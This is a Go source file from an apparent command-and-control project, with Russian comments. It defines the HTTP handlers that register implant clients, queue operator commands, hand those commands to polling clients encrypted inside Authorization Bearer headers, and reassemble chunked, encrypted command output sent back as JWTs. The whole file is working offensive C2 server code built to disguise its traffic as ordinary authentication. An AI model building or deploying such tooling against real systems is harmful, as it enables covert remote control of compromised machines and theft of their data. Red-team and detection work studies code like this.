package api

import (
	"c2-project/internal/chunk"
	"c2-project/internal/crypto"
	"c2-project/internal/jwt"
	"c2-project/internal/models"
	"c2-project/internal/protocol"
	"c2-project/internal/storage"
	"encoding/json"
	"log"
	"net/http"
)

// Handler - структура с зависимостями для хендлеров.
type Handler struct {
	store *storage.Storage
}

// NewHandler - создаёт новый Handler.
func NewHandler(store *storage.Storage) *Handler {
	return &Handler{store: store}
}

// RegisterHandler - обрабатывает регистрацию клиента.
func (h *Handler) RegisterHandler(w http.ResponseWriter, r *http.Request) {
	if !CheckMethod(w, r, http.MethodPost) {
		return
	}

	clientID := GetClientIDFromBearer(r.Header.Get("Authorization"))
	if clientID == "" {
		http.Error(w, "Missing or invalid Authorization header", http.StatusBadRequest)
		return
	}

	h.store.RegisterClient(clientID, r.RemoteAddr)

	log.Printf("[OK] Client registered: %s", clientID)
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// TasksHandler - принимает задачу от терминала.
func (h *Handler) TasksHandler(w http.ResponseWriter, r *http.Request) {
	if !CheckMethod(w, r, http.MethodPost) {
		return
	}

	token := GetTokenFromBearer(r.Header.Get("Authorization"))
	if token == "" {
		http.Error(w, "Missing or invalid Authorization header", http.StatusBadRequest)
		return
	}

	// Расшифровываем задачу
	data, err := protocol.DecodeRequest(token)
	if err != nil {
		http.Error(w, "Invalid token", http.StatusBadRequest)
		return
	}

	jsonData, _ := json.Marshal(data)
	var task models.Task
	json.Unmarshal(jsonData, &task)

	// Сохраняем задачу через storage
	taskID := h.store.CreateTask(task)

	log.Printf("[TASK] Task created: %s -> %s", taskID, task.Command)
	json.NewEncoder(w).Encode(map[string]string{"status": "created", "task_id": taskID})
}

// PollHandler - клиент опрашивает наличие задач.
func (h *Handler) PollHandler(w http.ResponseWriter, r *http.Request) {
	if !CheckMethod(w, r, http.MethodPost) {
		return
	}

	clientID := GetClientIDFromBearer(r.Header.Get("Authorization"))
	if clientID == "" {
		http.Error(w, "Missing or invalid Authorization header", http.StatusBadRequest)
		return
	}

	// Обновляем время последнего визита
	h.store.UpdateClientLastSeen(clientID)

	// Ищем задачу для клиента
	task, found := h.store.GetPendingTask(clientID)
	if !found {
		json.NewEncoder(w).Encode(map[string]string{"status": "no_tasks"})
		return
	}

	log.Printf("[TASK] Task %s found for client %s", task.ID, clientID)
	log.Printf("[ENCRYPT] ADDITIONAL ENCRYPTION of task %s", task.ID)

	// Дополнительно шифруем задачу перед отправкой
	token, err := protocol.EncodeRequest(task)
	if err != nil {
		http.Error(w, "Encoding error", http.StatusInternalServerError)
		return
	}

	log.Printf("[SEND] Encrypted task sent to client %s", clientID)
	w.Header().Set("Authorization", "Bearer "+token)
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// ResultsHandler - принимает результат от клиента.
func (h *Handler) ResultsHandler(w http.ResponseWriter, r *http.Request) {
	if !CheckMethod(w, r, http.MethodPost) {
		return
	}

	token := GetTokenFromBearer(r.Header.Get("Authorization"))
	if token == "" {
		http.Error(w, "Missing or invalid Authorization header", http.StatusBadRequest)
		return
	}

	log.Printf("[DEBUG] Received result token: %s...", token[:30])

	// Парсим JWT
	encrypted, err := jwt.Decode(token)
	if err != nil {
		log.Printf("[ERROR] JWT decode error: %v", err)
		http.Error(w, "Invalid JWT token", http.StatusBadRequest)
		return
	}

	// Расшифровываем данные
	decrypted, err := crypto.Decrypt(encrypted)
	if err != nil {
		log.Printf("[ERROR] Decryption error: %v", err)
		http.Error(w, "Decryption error", http.StatusBadRequest)
		return
	}

	// Пробуем распарсить как чанк
	var c chunk.Chunk
	if err := json.Unmarshal(decrypted, &c); err == nil && c.Type != "" {
		result, completed := chunk.Assemble(c)
		if !completed {
			log.Printf("[DEBUG] Chunk received, assembling...")
			json.NewEncoder(w).Encode(map[string]string{"status": "assembling"})
			return
		}
		log.Printf("[DEBUG] All chunks assembled, result length: %d", len(result))

		decryptedResult, err := crypto.Decrypt(result)
		if err != nil {
			log.Printf("[ERROR] Failed to decrypt assembled data: %v", err)
			http.Error(w, "Decryption error", http.StatusBadRequest)
			return
		}

		var finalResult map[string]interface{}
		if err := json.Unmarshal(decryptedResult, &finalResult); err != nil {
			log.Printf("[ERROR] Failed to parse assembled data: %v", err)
			http.Error(w, "Invalid assembled data", http.StatusBadRequest)
			return
		}

		taskID, _ := finalResult["task_id"].(string)
		output, _ := finalResult["output"].(string)
		status, _ := finalResult["status"].(string)

		h.store.UpdateTaskResult(taskID, output, status)

		log.Printf("[RESULT] Result received: %s -> %s", taskID, status)
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
		return
	}

	// Обычное сообщение (не чанк)
	var result map[string]interface{}
	if err := json.Unmarshal(decrypted, &result); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	taskID, _ := result["task_id"].(string)
	output, _ := result["output"].(string)
	status, _ := result["status"].(string)

	h.store.UpdateTaskResult(taskID, output, status)

	log.Printf("[RESULT] Result received: %s -> %s", taskID, status)
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// GetResultHandler - отдаёт результат задачи по её ID.
func (h *Handler) GetResultHandler(w http.ResponseWriter, r *http.Request) {
	if !CheckMethod(w, r, http.MethodGet) {
		return
	}

	taskID := r.URL.Query().Get("task_id")
	if taskID == "" {
		http.Error(w, "Missing task_id", http.StatusBadRequest)
		return
	}

	task, exists := h.store.GetTask(taskID)
	if !exists {
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}

	response := map[string]interface{}{
		"status": task.Status,
		"result": task.Result,
	}
	json.NewEncoder(w).Encode(response)
}
